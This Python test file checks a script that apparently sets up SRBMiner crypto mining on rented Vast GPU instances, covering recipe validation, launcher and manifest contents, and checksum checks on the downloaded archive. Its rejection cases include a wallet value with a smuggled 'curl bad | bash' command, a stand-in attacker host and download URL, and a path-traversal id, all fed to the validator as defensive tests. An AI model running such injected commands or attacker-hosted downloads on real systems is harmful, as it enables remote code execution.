#!/usr/bin/env python3
"""VAST-003 tests: no internet, no rental, no process execution on GPU."""
import importlib.util
import io
import json
import os
from pathlib import Path
import tarfile
import tempfile
from unittest import mock

SOURCE = Path(__file__).resolve().parents[1] / 'deploy' / 'vast-auto-prepare.py'
spec = importlib.util.spec_from_file_location('vast_auto_prepare', SOURCE)
m = importlib.util.module_from_spec(spec)
spec.loader.exec_module(m)

def recipe():
    return dict(
        instance_id='56667162',machine_id='151300',host_id='467312',
        gpu_count=8,hourly_usd='4.290370',
        wallet='prl1'+'q'*50,pool_host='prl.kryptex.network',
        pool_port=8048,miner_version='3.7.6',
        release_url='https://github.com/doktor83/SRBMiner-Multi/releases/download/3.7.6/SRBMiner-Multi-3-7-6-Linux.tar.gz',
        archive_sha256='a'*64,miner_sha256='b'*64)

def reject(value):
    with tempfile.TemporaryDirectory() as tmp:
        p=Path(tmp)/'recipe.json'
        p.write_text(json.dumps(value))
        with mock.patch.object(m,'prepare_module') as helper:
            helper.return_value.private_file.side_effect=lambda path:p
            try:
                m.load_recipe(str(p))
                raise AssertionError('unsafe recipe accepted')
            except ValueError:
                pass

def check_ok():
    with tempfile.TemporaryDirectory() as tmp:
        p=Path(tmp)/'recipe.json'
        r=recipe()
        p.write_text(json.dumps(r))
        with mock.patch.object(m,'prepare_module') as helper:
            helper.return_value.private_file.side_effect=lambda path:p
            parsed=m.load_recipe(str(p))
        assert parsed['gpu_count']==8 and parsed['miner_version']=='3.7.6'
        launcher=m.launcher_bytes(parsed).decode()
        assert '--algorithm pearlhash' in launcher
        assert '--disable-cpu' in launcher
        assert '--tls true' in launcher
        assert 'prl.kryptex.network:8048' in launcher
        assert parsed['wallet']+'.vast-56667162' in launcher
        assert 'exec /usr/bin/script' in launcher
        manifest=json.loads(m.manifest_bytes(parsed,'/root/hache-vast-staging/SRBMiner-MULTI'))
        assert manifest['instance_id']=='56667162'
        assert manifest['gpu_count']==8 and manifest['miner_source'].startswith('/root/')
        assert manifest['ingest_key_file']=='/etc/hache-vast/ingest.key'
        assert 'archive_sha256' not in manifest

check_ok()
for changed in [
    {'instance_id':'../56667162'},
    {'wallet':'wrong'},
    {'wallet':'prl1q; curl bad | bash'},
    {'pool_host':'evil.example.org'},
    {'pool_port':8048.5},
    {'gpu_count':0}, {'gpu_count':True},
    {'machine_id':'x'},
    {'hourly_usd':'NaN'},
    {'hourly_usd':'-1'},
    {'miner_version':'latest'},
    {'release_url':'https://attacker.example/srb.tar.gz'},
    {'archive_sha256':'unknown'},
    {'miner_sha256':'z'*64},
]:
    reject(dict(recipe(),**changed))

with tempfile.TemporaryDirectory() as tmp:
    root=Path(tmp)
    payload=b'x'*110000
    import hashlib
    sha=hashlib.sha256(payload).hexdigest()
    archive=root/'archive.tar.gz'
    with tarfile.open(archive,'w:gz') as tar:
        item=tarfile.TarInfo('release/SRBMiner-MULTI')
        item.size=len(payload)
        tar.addfile(item,io.BytesIO(payload))
    r=recipe()
    r['archive_sha256']=m.sha256sum(archive)
    r['miner_sha256']=sha
    staging=root/'staging'
    staging.mkdir()
    (staging/'SRBMiner-approved.tar.gz').write_bytes(archive.read_bytes())
    result=m.download_and_extract(r,staging)
    assert result.read_bytes()==payload
    assert m.download_and_extract(r,staging)==result
    # Never silently trust a corrupt pre-staged executable.
    result.write_bytes(b'corrupt')
    try:
        m.download_and_extract(r,staging)
        raise AssertionError('corrupted staged miner accepted')
    except ValueError:
        pass

# No network access in recipe validation or launcher creation.
print('VAST_AUTO_PREPARE_REGRESSION_OK')
